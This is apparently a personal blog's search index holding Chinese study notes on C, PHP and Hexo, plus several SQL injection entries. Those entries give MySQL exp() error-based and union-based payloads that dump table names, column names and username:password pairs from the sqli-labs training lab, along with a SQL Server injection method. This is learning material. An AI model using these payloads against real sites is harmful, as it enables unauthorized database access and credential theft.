<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>SQL：使用exp进行SQL报错注入</title>
      <link href="2020/12/02/sql-shi-yong-exp-jin-xing-sql-bao-cuo-zhu-ru/"/>
      <url>2020/12/02/sql-shi-yong-exp-jin-xing-sql-bao-cuo-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h1 id="一、注入数据："><a href="#一、注入数据：" class="headerlink" title="一、注入数据："></a>一、注入数据：</h1><p>当涉及到注入时，我们使用否定查询来造成“<code>DOUBLE value is out of range</code>”的错误。作者之前的博文提到的，将0按位取反就会返回“<code>18446744073709551615</code>”，再加上函数成功执行后返回0的缘故，我们将成功执行的函数取反就会得到最大的无符号<code>BIGINT</code>值。</p><pre><code>mysql&gt; select ~0;+----------------------+| ~0                   |+----------------------+| 18446744073709551615 |+----------------------+1 row in set (0.00 sec) mysql&gt; select ~(select version());+----------------------+| ~(select version())  |+----------------------+| 18446744073709551610 |+----------------------+1 row in set, 1 warning (0.00 sec)</code></pre><p>我们通过子查询与按位求反，造成一个<code>DOUBLE overflow error</code>，并借由此注出数据。</p><pre><code>&gt;`exp(~(select*from(select user())x))`    mysql&gt; select exp(~(select*from(select user())x));    ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'</code></pre><h1 id="二、注出数据："><a href="#二、注出数据：" class="headerlink" title="二、注出数据："></a>二、注出数据：</h1><p>得到表名：</p><pre><code>select exp(~(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x));</code></pre><p>得到列名：</p><pre><code>select exp(~(select*from(select column_name from information_schema.columns where table_name='users' limit 0,1)x));</code></pre><p>检索数据：</p><pre><code>select exp(~ (select*from(select concat_ws(':',id, username, password) from users limit 0,1)x));</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL:sqlilabs less-1-4:union注入</title>
      <link href="2020/11/26/sql-sqlilabs-less-1-4-union-zhu-ru/"/>
      <url>2020/11/26/sql-sqlilabs-less-1-4-union-zhu-ru/</url>
      
        <content type="html"><![CDATA[<p>爆数据的顺序就是①schema_name ②table_name ③column_name④把username连同password用group_concat函数连接</p><p>+————————————————————————————————————————————–+</p><p>①?id=-1’union select 1,group_concat(username,0x3a,password),3 from users–+</p><p>②?id=-1 union select 1,group_concat(username,0x3a,password),3 from users–+</p><p>③?id=-1’) union select 1,group_concat(username,0x3a,password),3 from users–+</p><p>④?id=-1”) union select 1,group_concat(username,0x3a,password),3 from users–+</p><p>总之就是“?id=”后不报错的语句加上语句“union select 1,group_concat(username,0x3a,password),3 from users–+”</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>C语言：变量的生存期和存储类型</title>
      <link href="2020/11/26/c-yu-yan-bian-liang-de-sheng-cun-qi-he-cun-chu-lei-xing/"/>
      <url>2020/11/26/c-yu-yan-bian-liang-de-sheng-cun-qi-he-cun-chu-lei-xing/</url>
      
        <content type="html"><![CDATA[<p>一、变量的生存期</p><p>C程序占用的存储空间可以分为程序区、静态存储区、动态存储区3个部分</p><p>程序区用于存放程序；静态存储区是在程序开始执行时就分配的固定存储单元，如全局变量；动态存储区是在函数调用过程中进行分配的存储单元，如函数形参、自动变量、函数调用时的现场保护和返回地址等。</p><p>存放在静态存储区的变量，其生存期从程序运行开始一直到程序运行结束；存放在动态存储区和寄存器的变量，其生存期从变量定义开始到函数运行结束为止。定义时可以使用auto，static，register，extern等关键字来说明变量的存储类型。</p><p>二、局部变量的存储类型</p><p>(1)自动变量</p><p>auto，存放于动态存储区，函数执行结束，占用的存储空间立即释放，作用域是其所在的函数。</p><p>(2)静态变量</p><p>static，运行期间占用存储空间不释放，下次再调用函数时，变量的值就是该函数上次调用后的值，定义静态变量时不赋初值，编译系统自动赋值（数值变量0，字符变量空字符）。</p><p>(3)寄存器变量</p><p>register，访问寄存器中的变量比访问内存快，生存周期与自动变量相同，寄存器变量只能是字符型变量，整形变量和指针类型的变量。</p><p>三、全局变量的储存类型</p><p>(4)外部变量</p><p>extern，外部变量是定义在函数外的全局变量，存放在静态存储区中，其生存期存在于程序的整个运行过程；作用域从定义开始至程序末尾；</p><p>(5)静态全局变量</p><p>static，静态全局变量的作用域限制在定义该变量的源文件内，其他源文件不能使用它。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL：联合注入</title>
      <link href="2020/11/24/sql-lian-he-zhu-ru/"/>
      <url>2020/11/24/sql-lian-he-zhu-ru/</url>
      
        <content type="html"><![CDATA[<p>操作是这样：</p><p>?id=-1’union select 1,group_concat(schema_name),3 from information_schema.schemata–+<br>Your Login name:information_schema,challenges,mysql,performance_schema,security,test<br>Your Password:3</p><p>?id=-1’union select 1, 2, group_concat(schema_name) from information_schema.schemata–+<br>Your Login name:2<br>Your Password:information_schema,challenges,mysql,performance_schema,security,test</p><p>?id=-1’union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’security’–+<br>Your Login name:emails,referers,uagents,users<br>Your Password:3</p><p>?id=-1’union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’users’–+<br>Your Login name:id,username,password<br>Your Password:3</p><p>?id=99’union select 1,group_concat(concat_ws(‘:’,username,password)),3 from security.users–+<br>Your Login name:Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,secure:crappy,stupid:stupidity,supefrman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4<br>Your Password:3</p><p>结果是这样：</p><p>![]J5EF4ELJ<del>C[9C70[$X]4Y8](D:\blog\source_posts\SQL第一关]J5EF4ELJ</del>C[9C70[$X]4Y8.png)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL：在SQL server的注入</title>
      <link href="2020/11/24/sql-zai-sql-server-de-zhu-ru/"/>
      <url>2020/11/24/sql-zai-sql-server-de-zhu-ru/</url>
      
        <content type="html"><![CDATA[<p>一、测试SQL注入的存在：</p><p>测试步骤如下：</p><p>1.数字型注入</p><p>①HTTP://<a href="http://www.xxser.com/test.php?id=8'">www.xxser.com/test.php?id=8'</a></p><p>SQL语句为: select * from table where id=8’，这样的语句肯定会出错，导致脚本程序无法从数据库中正常获取数据，从而使原来的页面出现异常。</p><p>②HTTP://<a href="http://www.xxser.com/test.php?id=8">www.xxser.com/test.php?id=8</a> and 1=1</p><p>SQL语句为select * from table where id=8 and 1=1,语句执行正常，返回数据与原始请求无任何差异。</p><p>③HTTP://<a href="http://www.xxser.com/test.php?id=8">www.xxser.com/test.php?id=8</a> and 1=2</p><p>SQL语句变为 select * from table where id=8 and 1=2 ,语句执行正常，但却无法查询出数据，因为“ and 1=2 ”始终为假。所以返回数据与原始请求有差异。</p><p>如果以上三个步骤全部满足，则程序就可能存在SQL注入漏洞。</p><p>强类型语言在这方面比弱类型语言有优势。</p><p>2.字符型注入</p><p>当输入参数为字符串时，称为字符型。数字型与字符型注入最大的区别在于:数字类型不需要单引号闭合，而字符串类型般要使用单引号来闭合。</p><p>字符型注入最关键的是如何闭合SQL语句以及注释多余的代码。</p><p>当查询内容为字符串时，SQL代码如下:</p><p>select * from  table where username =’admin’</p><p>当攻击者进行SQL注入时，如果输入“admin and 1=1”，则无法进行注入。因为“admin and1=1”会被数据库当作查询的字符串，SQL语句如下:</p><p>select * from table where username =’admin and 1=1’</p><p>这时想要进行注入，则必须注意字符串闭合问题。如果输入”admin’ and1=1–“就可以继续注入，SQL语句如下:</p><p>select ★from table where username =’admin’ and 1=1 –’</p><p>只要是字符串类型注入，都必须闭合单引号以及注释多余的代码。例如，update 语句: update Person set username =’username ‘,set password= ‘password’ where id=1</p><p>现在对该SQL语句进行注入，就需要闭合单引号，可以在username或password处插入语 句为“’+(select @@version)+’”，最终执行的SQL语句为:</p><p>update person set username=’username’ , set password=’ ‘+ (select@@version)+ ‘ ‘ where id=1 </p><p>利用两次单引号闭合才完成SQL注入。</p><p>二、order by 语句判断数据表列数，例如：</p><p>order by 3不报错，order by 4 报错 ，则数据表有三列</p><p>注：常用表视图：</p><p>![76A13B7656A8D4B40651E87F62988610](D:\blog\source_posts\SQL注入-1(SQL server)\76A13B7656A8D4B40651E87F62988610.png)</p><p>三：UNION查询：</p><p>联合查询敏感信息</p><p>如果得知列数为4，可以使用以下语句继续注入：</p><p>id=5 union select ‘x’,null,null,null from sysobject where xtype=’U’</p><p>如果第一列数据类型不匹配，数据库将会报错，这时可以继续递归查询，知道语句正常执行为止。</p><p>id=5 union select null,’x’,null,null from sysobject where xtype=’U’</p><p>id=5 union select null,null,’x’,null from sysobject where xtype=’U’</p><p>语句执行正常，代表数据类型兼容，就可以将x替换为SQL语句，查询敏感信息。</p><p>四、使用系统函数：</p><p>select suser_name():返回用户的登录标识名；</p><p>select user_name():基于指定的标识号返回数据库用户名；</p><p>select db_name():返回数据库名称；</p><p>select is_member(‘db_owner’):是否为数据库角色；</p><p>select convert(int,’5’):数据类型转换。</p><p>注：SQL server常用函数：</p><p>![E6530B94DE1FE160A7E73BE22883E2C2](D:\blog\source_posts\SQL注入-1(SQL server)\E6530B94DE1FE160A7E73BE22883E2C2.png)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>C语言：四舍五入两种方法</title>
      <link href="2020/11/22/c-yu-yan-si-she-wu-ru-liang-chong-fang-fa/"/>
      <url>2020/11/22/c-yu-yan-si-she-wu-ru-liang-chong-fang-fa/</url>
      
        <content type="html"><![CDATA[<p>a的第n位四舍五入</p><p>一、</p><p>a = (int)(pow(10,n) * a + 0.5) / pow(10,n);</p><p>以1.23456为例</p><p>a = (int）(1000.0 * a + 0.5) / 1000.0；<br>即可。如果要保留四位小数，就把1000都换成10000，依次类推。</p><p>二、</p><p>其实，用C语言中的printf控制好精度后，要输出几位小数，然后输出可以自动进行四舍五入，不需要人工舍入了（若不是要利用舍入后的结果参与运算，而是单纯地想控制输出格式的时候）。<br>下面的代码可以简单验证：</p><p>#include&lt;stdio.h&gt;</p><p> int main() </p><p>{ </p><p>float a=2.1234567;</p><p> float b=3.016237; </p><p>printf(“%.4f\n”,a);    <em>//输出：2.1235，自动进行了四舍五入。</em>  </p><p>printf(“%.2f\n”,b);    <em>//输出：3.02，自动进行了四舍五入。</em> </p><p> printf(“%.3f\n”,b);    <em>//输出：3.016，自动进行了四舍五入。</em></p><p>  return 0;</p><p> }</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>C语言：宏定义</title>
      <link href="2020/11/17/c-yu-yan-hong-ding-yi/"/>
      <url>2020/11/17/c-yu-yan-hong-ding-yi/</url>
      
        <content type="html"><![CDATA[<p>5.6.1  无参宏定义</p><p>无参宏定义即定义一个没有参数的宏。</p><p>#define 标识符 字符串</p><p>5.6.2  带参宏定义</p><p>在宏定义中的参数称为形式参数，在调用带参宏时给出的参数称为实际参数</p><p>#define 宏名(形参表) 字符串</p><p>在使用带参宏定义时，应注意以下问题：</p><p>1.在带参宏定义中，宏名与其后的左括号之间不应加空格,否则将变成无参宏定义</p><p>2.在带参宏定义中，一般应将字符串及字符串中的形参用圆括号括起来</p><p>带参宏定义与函数的主要区别如下：</p><p>1.函数调用时，先求出实参表达式的值，然后代入形参。而使用带参数的宏只是进行简单的字符替换。</p><p>2.函数调用是在程序运行时处理的。为形参分配临时的内在单元。而宏展开则是在编译前进行的，在展开时并不分配内存单元，不进行值的传递处理，也没有“返回值”的概念。</p><p>3.对函数中的实参和形参都要定义类型，二者的关型要求一致。如不一致，应进行类型转换。而宏不存在类型问题，安名无类型， 它的参数也无类型，只是一个符号代表，展开时代入指定的字符串即可。宏定义时，字符串可以是任何类型的数据。</p><p>4.调用函数只可得到一个返回值，而用宏可以设法得到几个结果。</p><p>5.宏替换不占运行时间，只占编译时间。而函数调用则占运行时间。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>C语言：函数数据类型</title>
      <link href="2020/11/06/c-yu-yan-han-shu-shu-ju-lei-xing/"/>
      <url>2020/11/06/c-yu-yan-han-shu-shu-ju-lei-xing/</url>
      
        <content type="html"><![CDATA[<h1 id="C-数据类型"><a href="#C-数据类型" class="headerlink" title="C 数据类型"></a>C 数据类型</h1><p>在 C 语言中，数据类型指的是用于声明不同类型的变量或函数的一个广泛的系统。变量的类型决定了变量存储占用的空间，以及如何解释存储的位模式。</p><p>C 中的类型可分为以下几种：</p><table><thead><tr><th align="left">序号</th><th align="left">类型与描述</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><strong>基本类型：</strong> 它们是算术类型，包括两种类型：整数类型和浮点类型。</td></tr><tr><td align="left">2</td><td align="left"><strong>枚举类型：</strong> 它们也是算术类型，被用来定义在程序中只能赋予其一定的离散整数值的变量。</td></tr><tr><td align="left">3</td><td align="left"><strong>void 类型：</strong> 类型说明符 <em>void</em> 表明没有可用的值。</td></tr><tr><td align="left">4</td><td align="left"><strong>派生类型：</strong> 它们包括：指针类型、数组类型、结构类型、共用体类型和函数类型。</td></tr></tbody></table><p>数组类型和结构类型统称为聚合类型。函数的类型指的是函数返回值的类型。在本章节接下来的部分我们将介绍基本类型，其他几种类型会在后边几个章节中进行讲解。</p><h2 id="整数类型"><a href="#整数类型" class="headerlink" title="整数类型"></a>整数类型</h2><p>下表列出了关于标准整数类型的存储大小和值范围的细节：</p><table><thead><tr><th align="left">类型</th><th align="left">存储大小</th><th align="left">值范围</th></tr></thead><tbody><tr><td align="left">char</td><td align="left">1 字节</td><td align="left">-128 到 127 或 0 到 255</td></tr><tr><td align="left">unsigned char</td><td align="left">1 字节</td><td align="left">0 到 255</td></tr><tr><td align="left">signed char</td><td align="left">1 字节</td><td align="left">-128 到 127</td></tr><tr><td align="left">int</td><td align="left">2 或 4 字节</td><td align="left">-32,768 到 32,767 或 -2,147,483,648 到 2,147,483,647</td></tr><tr><td align="left">unsigned int</td><td align="left">2 或 4 字节</td><td align="left">0 到 65,535 或 0 到 4,294,967,295</td></tr><tr><td align="left">short</td><td align="left">2 字节</td><td align="left">-32,768 到 32,767</td></tr><tr><td align="left">unsigned short</td><td align="left">2 字节</td><td align="left">0 到 65,535</td></tr><tr><td align="left">long</td><td align="left">4 字节</td><td align="left">-2,147,483,648 到 2,147,483,647</td></tr><tr><td align="left">unsigned long</td><td align="left">4 字节</td><td align="left">0 到 4,294,967,295</td></tr></tbody></table><blockquote><p>注意，各种类型的存储大小与系统位数有关，但目前通用的以64位系统为主。</p></blockquote><p>为了得到某个类型或某个变量在特定平台上的准确大小，您可以使用 <strong>sizeof</strong> 运算符。表达式 <em>sizeof(type)</em> 得到对象或类型的存储字节大小。下面的实例演示了获取 int 类型的大小：</p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>#include &lt;stdio.h&gt; #include &lt;limits.h&gt;  int main() {   printf(“int 存储大小 : %lu \n”, sizeof(int));      return 0; }</p><p><strong>%lu</strong> 为 32 位无符号整数，详细说明查看 <a href="https://www.runoob.com/cprogramming/c-function-printf.html">C 库函数 - printf()</a>。</p><p>当您在 Linux 上编译并执行上面的程序时，它会产生下列结果：</p><pre><code>int 存储大小 : 4 </code></pre><h2 id="浮点类型"><a href="#浮点类型" class="headerlink" title="浮点类型"></a>浮点类型</h2><p>下表列出了关于标准浮点类型的存储大小、值范围和精度的细节：</p><table><thead><tr><th align="left">类型</th><th align="left">存储大小</th><th align="left">值范围</th><th align="left">精度</th></tr></thead><tbody><tr><td align="left">float</td><td align="left">4 字节</td><td align="left">1.2E-38 到 3.4E+38</td><td align="left">6 位小数</td></tr><tr><td align="left">double</td><td align="left">8 字节</td><td align="left">2.3E-308 到 1.7E+308</td><td align="left">15 位小数</td></tr><tr><td align="left">long double</td><td align="left">16 字节</td><td align="left">3.4E-4932 到 1.1E+4932</td><td align="left">19 位小数</td></tr></tbody></table><p>头文件 float.h 定义了宏，在程序中可以使用这些值和其他有关实数二进制表示的细节。下面的实例将输出浮点类型占用的存储空间以及它的范围值：</p><h2 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h2><p>#include &lt;stdio.h&gt; #include &lt;float.h&gt;  int main() {   printf(“float 存储最大字节数 : %lu \n”, sizeof(float));   printf(“float 最小值: %E\n”, FLT_MIN );   printf(“float 最大值: %E\n”, FLT_MAX );   printf(“精度值: %d\n”, FLT_DIG );      return 0; }</p><p><strong>%E</strong> 为以指数形式输出单、双精度实数，详细说明查看 <a href="https://www.runoob.com/cprogramming/c-function-printf.html">C 库函数 - printf()</a>。</p><p>当您在 Linux 上编译并执行上面的程序时，它会产生下列结果：</p><pre><code>float 存储最大字节数 : 4 float 最小值: 1.175494E-38float 最大值: 3.402823E+38精度值: 6</code></pre><h2 id="void-类型"><a href="#void-类型" class="headerlink" title="void 类型"></a>void 类型</h2><p>void 类型指定没有可用的值。它通常用于以下三种情况下：</p><table><thead><tr><th align="left">序号</th><th align="left">类型与描述</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><strong>函数返回为空</strong> C 中有各种函数都不返回值，或者您可以说它们返回空。不返回值的函数的返回类型为空。例如 <strong>void exit (int status);</strong></td></tr><tr><td align="left">2</td><td align="left"><strong>函数参数为空</strong> C 中有各种函数不接受任何参数。不带参数的函数可以接受一个 void。例如 <strong>int rand(void);</strong></td></tr><tr><td align="left">3</td><td align="left"><strong>指针指向 void</strong> 类型为 void * 的指针代表对象的地址，而不是类型。例如，内存分配函数 <strong>void *malloc( size_t size );</strong> 返回指向 void 的指针，可以转换为任何数据类型。</td></tr></tbody></table><p>如果现在您还是无法完全理解 void 类型，不用太担心，在后续的章节中我们将会详细讲解这些概念。</p><p> <a href="https://www.runoob.com/cprogramming/c-basic-syntax.html">C 基本语法</a></p><p><a href="https://www.runoob.com/cprogramming/c-variables.html">C 变量</a> </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>C语言：程序的控制结构</title>
      <link href="2020/11/05/c-yu-yan-cheng-xu-de-kong-zhi-jie-gou/"/>
      <url>2020/11/05/c-yu-yan-cheng-xu-de-kong-zhi-jie-gou/</url>
      
        <content type="html"><![CDATA[<h1 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h1><p>有的时候，我们可能需要多次执行同一块代码。一般情况下，语句是按顺序执行的：函数中的第一个语句先执行，接着是第二个语句，依此类推。</p><p>编程语言提供了更为复杂执行路径的多种控制结构。</p><p>循环语句允许我们多次执行一个语句或语句组，下面是大多数编程语言中循环语句的流程图：</p><h2 id="循环类型"><a href="#循环类型" class="headerlink" title="循环类型"></a>循环类型</h2><p>C 语言提供了以下几种循环类型。点击链接查看每个类型的细节。</p><table><thead><tr><th align="left">循环类型</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><a href="https://www.runoob.com/cprogramming/c-while-loop.html">while 循环</a></td><td align="left">当给定条件为真时，重复语句或语句组。它会在执行循环主体之前测试条件。</td></tr><tr><td align="left"><a href="https://www.runoob.com/cprogramming/c-for-loop.html">for 循环</a></td><td align="left">多次执行一个语句序列，简化管理循环变量的代码。</td></tr><tr><td align="left"><a href="https://www.runoob.com/cprogramming/c-do-while-loop.html">do…while 循环</a></td><td align="left">除了它是在循环主体结尾测试条件外，其他与 while 语句类似。</td></tr><tr><td align="left"><a href="https://www.runoob.com/cprogramming/c-nested-loops.html">嵌套循环</a></td><td align="left">您可以在 while、for 或 do..while 循环内使用一个或多个循环。</td></tr></tbody></table><h2 id="循环控制语句"><a href="#循环控制语句" class="headerlink" title="循环控制语句"></a>循环控制语句</h2><p>循环控制语句改变你代码的执行顺序。通过它你可以实现代码的跳转。</p><p>C 提供了下列的循环控制语句。点击链接查看每个语句的细节。</p><table><thead><tr><th align="left">控制语句</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><a href="https://www.runoob.com/cprogramming/c-break-statement.html">break 语句</a></td><td align="left">终止<strong>循环</strong>或 <strong>switch</strong> 语句，程序流将继续执行紧接着循环或 switch 的下一条语句。</td></tr><tr><td align="left"><a href="https://www.runoob.com/cprogramming/c-continue-statement.html">continue 语句</a></td><td align="left">告诉一个循环体立刻停止本次循环迭代，重新开始下次循环迭代。</td></tr><tr><td align="left"><a href="https://www.runoob.com/cprogramming/c-goto-statement.html">goto 语句</a></td><td align="left">将控制转移到被标记的语句。但是不建议在程序中使用 goto 语句。</td></tr></tbody></table><h2 id="无限循环"><a href="#无限循环" class="headerlink" title="无限循环"></a>无限循环</h2><p>如果条件永远不为假，则循环将变成无限循环。<strong>for</strong> 循环在传统意义上可用于实现无限循环。由于构成循环的三个表达式中任何一个都不是必需的，您可以将某些条件表达式留空来构成一个无限循环。</p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>#include &lt;stdio.h&gt;  int main () {   for( ; ; )   {      printf(“该循环会永远执行下去！\n”);   }   return 0; }</p><p>当条件表达式不存在时，它被假设为真。您也可以设置一个初始值和增量表达式，但是一般情况下，C 程序员偏向于使用 for(;;) 结构来表示一个无限循环。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>C语言：运算符和结合性</title>
      <link href="2020/11/05/c-yu-yan-yun-suan-fu-he-jie-he-xing/"/>
      <url>2020/11/05/c-yu-yan-yun-suan-fu-he-jie-he-xing/</url>
      
        <content type="html"><![CDATA[<p>一、（自左向右）</p><p>[ ]数组下标</p><p>（ ）圆括号</p><p>.  成员选择</p><p>-&gt;  成员选择</p><p>二、（自左向右，单目）</p><p>－负号运算符</p><p>（类型）强制类型转换</p><p>++自增运算符</p><p>－－自减运算符</p><p>*指针运算符</p><p>&amp;取地址运算符</p><p>！逻辑非运算符</p><p>~按位取反运算符</p><p>sizeof 长度运算符</p><p>三、（自左向右  双目）</p><p>*乘法运算符</p><p>/除法运算符</p><p>%求余运算符</p><p>四、自左向右 双目</p><p>+－ 加减运算符</p><p>五、自左向右 双目</p><p>《》左右移运算符</p><p>六、自左向右 双目</p><p>a&gt;  ,&gt;=,&lt;,&lt;=关系运算符</p><p>七、自左向右双目</p><p>== ！=</p><p>八、自左向右 双目</p><p>&amp; 按位与</p><p>九自左向右 双目</p><p>^ 按位异或</p><p>十自左向右 双目</p><p>|按位或</p><p>十一、自左向右 双目</p><p>&amp;&amp; 逻辑与</p><p>十二、自左向右 双目</p><p>||逻辑或</p><p>十三、自右向左 三目</p><p>？：条件运算符</p><p>十四自右向左 双目</p><p>赋值运算符</p><p>十五、自左向右</p><p>， 逗号运算符</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>C语言：字符串处理函数</title>
      <link href="2020/11/05/c-yu-yan-zi-fu-chuan-chu-li-han-shu/"/>
      <url>2020/11/05/c-yu-yan-zi-fu-chuan-chu-li-han-shu/</url>
      
        <content type="html"><![CDATA[<p>C语言 （3）字符串处理函数 </p><p>C语言提供了丰富的字符串处理函数，用来实现对字符串的输入、输出、合并、修改、比较、转换和复制等功能。<br>(1)字符串输入函数gets()<br>语法格式<br>        gets(字符数组名)<br>功能<br>        从终端输入一个字符串到字符数组，并且返回该字符数组的起始地址。<br>(2)字符串输出函数puts()<br>语法格式<br>        puts (字符数组名)</p><p>[功能]</p><p>​         将一个字符串，(以0结束的字符序列)输出到终端。</p><p>(3)字符串连接函数strcat()</p><p>[语法格式]</p><p>​        strcat(字符数组1,字符数组2)</p><p>[功能]</p><p>​         连接两个字符数组中的字符串，把字符串2连接到字符串1的后面，把得到的结果放在字符数组1中。</p><p>(4)字符串复制函数strcpy() </p><p>[语法格式]</p><p>​         strcpy(字符数组1,字符串2)</p><p>[功能]</p><p>​        把字符串2连同串结束标志10复制到字符数组1中，其中字符串2可以是字符数组或字符串常量</p><p>(5)字符串比较函数strcmp()</p><p>[语法格式]</p><p>​        strcmp(字符串1,字符串2)</p><p>[功能]</p><p>​        将字符串1和字符串2中的两个字符串自左向右按照各字符的ASCII码值逐对进行比较，直到出现不同的字符或遇到N0为止。函数的返回值:①若字符串1=字符串2,则返回值为0;②若字符串1&gt;字符串2,则返回值为正整数;③若字符串1&lt;字符串2,则返回值为负整数。</p><p>(6) 求字符串长度函数strlen()</p><p>[语法格式]</p><p>​        strlen(字符串)</p><p>[功能]</p><p>​        测试字符串长度，即字符串中字符的个数，不包括’\0’。</p><p>(7)大写字母转换为小写字母函数strlwr()</p><p>[语法格式]</p><p>​        strlwr(字符串)</p><p>[功能)]</p><p>​        将字符串中大写字母转换成小写字母。</p><p>(8)小写字母转换为大写字母函数strupr()</p><p>[语法格式]</p><p>​       strupr(字符串)</p><p>[功能]</p><p>​        将字符串中小写字母转换成大写字母。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>c语言：运算符和表达式（2）</title>
      <link href="2020/10/22/c-yu-yan-yun-suan-fu-he-biao-da-shi-2/"/>
      <url>2020/10/22/c-yu-yan-yun-suan-fu-he-biao-da-shi-2/</url>
      
        <content type="html"><![CDATA[<p>五·位运算符和位运算表达式</p><p>​    操作符  名称  优先  结合 对象</p><p>~  按位取反  1 ←  单</p><p>《  按位左移  2  →  双</p><p>  》按位右移  3  →  双</p><p>&amp;  按位与  4  →  双</p><p>^  按位异或  5  →  双</p><p>|  按位或  6 →  双</p><p>1·按位取反</p><p>​    ~  操作数</p><p>2·按位移 </p><p>​    操作数  《（》） 左（右）移位数</p><p>3·按位与</p><p>​    操作数 1&amp;操作数2</p><p>​    如果操作数相应位数都为一，则该位为一否则为零</p><p>4·按位异或运算</p><p>​    操作数1^操作数2</p><p>操作数相应位相同为1 相异为零</p><p>5·按位或</p><p>   操作数1|操作数2</p><p>操作数相应位均为零为零 否则为一</p><p>六·条件运算符和条件表达式</p><p> 判定式？表达式1：表达式2</p><p>三目运算  自左向右</p><p>七·逗号运算符和逗号表达式</p><p>   自左向右 取最右值</p><p>八·求字节运算符与求字节表达式</p><p>sizeof（类型名|变量名） 单目</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>c语言：运算符和表达式（1）</title>
      <link href="2020/10/22/c-yu-yan-yun-suan-fu-he-biao-da-shi-1/"/>
      <url>2020/10/22/c-yu-yan-yun-suan-fu-he-biao-da-shi-1/</url>
      
        <content type="html"><![CDATA[<p>一·算术运算符</p><p>​    1.自增和自减运算符（自左向右）</p><p>​     ++i 在使用变量之前 先使i的值加一</p><p>​     –i   在使用变量之前 先使i的值减一</p><p>​     ++  使用变量i之后，使i的值加一</p><p>​     i–   使用变量i之后，使i的值加一</p><p>二·赋值运算符和赋值表达式</p><p>​    分以简单赋值“=”算数复合赋值“*=”，“+=”，“-=”，“/=‘’，”%=“和位复合运算赋值”&gt;&gt;=“，”&lt;&lt;=“,”&amp;=”，“^=”，“|=”三类共十一种（自右向左）</p><p>赋值表达式</p><p>​    变量名  赋值运算符  表达式</p><p>三·关系运算符与关系表达式</p><p>  （&gt;,&gt;=,&lt;,&lt;=)  优先级较高</p><p>  （==，！=）优先级较低</p><p>关系表达式</p><p>​    表达式1  关系运算符  表达式2</p><p>四·逻辑运算符与逻辑表达式</p><p>1·逻辑运算符（自左向右）</p><p>​     ！逻辑非（自右向左）</p><p>​     &amp;&amp; 逻辑与 双真则真</p><p>​     || 逻辑或  单真则真</p><p>2·逻辑运算符优先级从高到低为</p><p>​    “！” →算术→关系→“&amp;&amp;”→“//“→赋值</p><p>3·逻辑表达式</p><p>​    [表达式1]  逻辑运算符  表达式2</p><p>​    一旦能够确定逻辑表达式的值，就立即结束运算，不在进行后面表达式的运算。逻辑运算的结果为0或1。</p><p>​     “&amp;&amp;”“//“都对操作数有”短路“计算，对于”&amp;&amp;“只有左边表达式为真，才计算右边表达式的值，对于”||“只有左边表达式为假，才计算右边表达式的值。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>博客更新三步</title>
      <link href="2020/10/14/bo-ke-geng-xin-san-bu/"/>
      <url>2020/10/14/bo-ke-geng-xin-san-bu/</url>
      
        <content type="html"><![CDATA[<ol><li><p>在博客根目录下 hexo new post “文章标题”</p></li><li><p>hexo g</p></li><li><p>hexo d</p></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP：基本语法（2）</title>
      <link href="2020/10/14/php-ji-ben-yu-fa-2/"/>
      <url>2020/10/14/php-ji-ben-yu-fa-2/</url>
      
        <content type="html"><![CDATA[<p>1.PHP 逻辑运算符</p><p><strong>运算符    名称    描述    实例<br>x and y    与    如果 x 和 y 都为 true，则返回 true    x=6 y=3 (x &lt; 10 and y &gt; 1) 返回 true<br>x or y    或    如果 x 和 y 至少有一个为 true，则返回 true    x=6 y=3 (x==6 or y==5) 返回 true<br>x xor y    异或    如果 x 和 y 有且仅有一个为 true，则返回 true    x=6 y=3 (x==6 xor y==3) 返回 false<br>x &amp;&amp; y    与    如果 x 和 y 都为 true，则返回 true    x=6 y=3(x &lt; 10 &amp;&amp; y &gt; 1) 返回 true<br>x || y    或    如果 x 和 y 至少有一个为 true，则返回 true    x=6 y=3(x==5 || y==5) 返回 false<br>! x    非    如果 x 不为 true，则返回 true    x=6y=3!(x==y) 返回 true<br>**2.PHP 数组运算符</strong><br>运算符    名称    描述<br>x + y    集合    x 和 y 的集合<br>x == y    相等    如果 x 和 y 具有相同的键/值对，则返回 true<br>x === y    恒等    如果 x 和 y 具有相同的键/值对，且顺序相同类型相同，则返回 true<br>x != y    不相等    如果 x 不等于 y，则返回 true<br>x &lt;&gt; y    不相等    如果 x 不等于 y，则返回 true<br>x !== y    不恒等    如果 x 不等于 y，则返回 true<br>以下实例演示了使用一些数组运算符得到的不同结果：</p><p>实例<br><!--?php$x = array("a" =--> "red", "b" =&gt; "green"); $y = array("c" =&gt; "blue", "d" =&gt; "yellow"); $z = $x + $y; // $x 和 $y 数组合并var_dump($z);var_dump($x == $y);var_dump($x === $y);var_dump($x != 